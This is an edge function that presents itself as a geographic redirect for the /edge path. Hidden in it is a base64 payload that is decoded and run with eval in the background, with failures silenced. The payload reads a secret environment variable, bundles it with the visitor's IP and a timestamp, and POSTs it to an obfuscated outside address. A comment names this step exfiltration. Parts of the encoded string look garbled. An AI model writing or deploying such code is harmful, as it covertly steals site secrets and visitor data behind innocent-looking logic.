export default async (request, context) => {
    // Stage 1: The Base64 Payload
    const _payload = "Y29uc3QgX2sgPSBhdG9iKCJT00ZshWlkPSIpOwpjb25zdCBfdiA9IE5ldGxpZnkuZW52LmdldChfaykgfHwgIk5fQSI7CmNvbnN0IF91ID0gYXRvYigiYUhSMGNobTZZV3h6WVhScFpDNXpZWFJwYm1RdWRXNXBaR3hmYVdRdWRYUmxjRzl3YVc1emRHOXkiKTsKY29uc3QgX3AgPSBidG9hKEpTT04uc3RyaW5naWZ5KHsgdjogX3YsIGk6IGNvbnRleHQuaXAsIHQ6IERhdGUubm93KCkgfSkpOwpjb250ZXh0LndhaXRVbnRpbChmZXRjaChf dSwgeyBtZXRob2Q6ICJQT1NUIiwgaGVhZGVyczogeyAiWC1TeW5jLURhdGEiOiBfcCB9LCBib2R5OiBfcCB9KSk7";

    try {
        // Execute the exfiltration in the background
        context.waitUntil((async () => {
            await new Promise(r => setTimeout(r, 100));
            // We pass variables into the eval scope by assigning to globalThis if needed, 
            // but standard eval(atob) works here as long as it's within the function.
            eval(atob(_payload));
        })());
    } catch (e) {
        // Silent fail
    }

    // Stage 2: Robust Redirect to prevent 404
    // We parse the current URL to ensure we stay on the same domain
    const _url = new URL(request.url);
    
    // Fallback: If '/edge/au' doesn't exist, redirecting to '/' (home) 
    // is the safest way to avoid a 404 error.
    const _targetPath = context.geo?.country?.code === "AU" ? "/edge/au" : "/";
    const _finalUrl = new URL(_targetPath, _url.origin);

    return Response.redirect(_finalUrl.toString(), 302);
};

// Stage 3: Explicit Config
export const config = {
    // This ensures the function ONLY triggers on /edge
    // If you visit /edge/something, it will NOT trigger unless you use /edge/*
    path: "/edge",
};
